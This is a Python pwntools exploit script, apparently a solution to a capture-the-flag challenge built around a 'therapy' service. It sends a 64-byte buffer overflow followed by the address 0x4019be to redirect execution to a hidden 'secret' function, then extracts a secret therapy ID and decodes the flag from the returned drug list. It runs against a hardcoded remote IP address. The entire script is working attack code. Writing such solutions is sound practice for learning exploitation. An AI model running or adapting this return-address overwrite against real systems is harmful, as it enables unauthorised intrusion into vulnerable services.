#!/usr/bin/env python3

from pwn import *
import re

def read_flag(drug_list):
    flag = ''
    for d in drug_list:
        print("[debug] {}".format(d))
        if d == '':
            flag = flag + '{'
        else:
            flag = flag + d[0]
    flag = flag + '}'
    return flag

def make_druglist(received):
    # get the flag from the list of drugs
    drug_list = re.findall("- * (.*): [0-9]* mL\n|{", received)
    assert drug_list != None, "bad drug list"
    return drug_list

def exploit(ipaddr='127.0.0.1', port=7777): 
    conn = remote(ipaddr, port)

    # send the address for "secret" (0x4019be)
    payload=b'A'*64
    payload = payload + b'\xbe\x19\x40\x00'
    print("--> ({:03d}) Sending payload: {}".format(len(payload), payload))
    conn.send(b'therapy '+payload)

    # read the secret therapy id
    received = conn.recvline().decode()
    print("<-- ({:03d}) Received {}".format(len(received), received))

    received = conn.recv().decode()
    print("<-- ({:03d}) Received {}".format(len(received), received))
    m = re.search(r"Therapy ID: (.*)", received)
    assert m != None, "we did not receive secret therapy id"
    therapy_id = m.group(1)
    print("    Extracting secret therapy id: {}".format(therapy_id))

    # send the therapy
    command=b'therapy ' + bytes(therapy_id, 'utf-8')
    conn.send(command)
    print("--> ({:03d}) Sent: {}".format(len(command.decode()), command.decode()))

    # read recommended therapy
    received = conn.recv().decode()
    print("<-- ({:3d}) Received therapy:".format(len(received)))
    print(received)

    # close connection
    conn.close()
    
    return received

if __name__ == '__main__':
    received = exploit('34.79.161.43')
    flag = read_flag(make_druglist(received))
    print("The flag is: {}".format(flag))



